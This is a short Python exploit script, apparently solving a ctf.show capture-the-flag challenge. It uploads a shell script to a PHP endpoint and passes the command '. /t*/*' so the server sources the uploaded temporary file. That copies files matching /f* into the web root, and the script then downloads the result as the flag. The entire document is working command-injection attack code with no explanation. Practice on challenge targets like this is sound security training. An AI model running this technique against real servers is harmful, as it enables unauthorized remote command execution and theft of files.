import requests

url = 'http://4a250af8-d2dd-4f75-ac03-9f2edbce2fb6.challenge.ctf.show/'

file = {"file": "#!/bin/sh\ncat /f* > /var/www/html/flag.txt"}
data = {"cmd": ". /t*/*"}
response = requests.post(url+"api/tools.php", files=file, data=data)
if "t*" in response.text:
    print("The command has been executed.")
response = requests.get(url=url+'flag.txt')
if response.status_code == 200:
    print('flag: '+response.text)
else:
    print('error')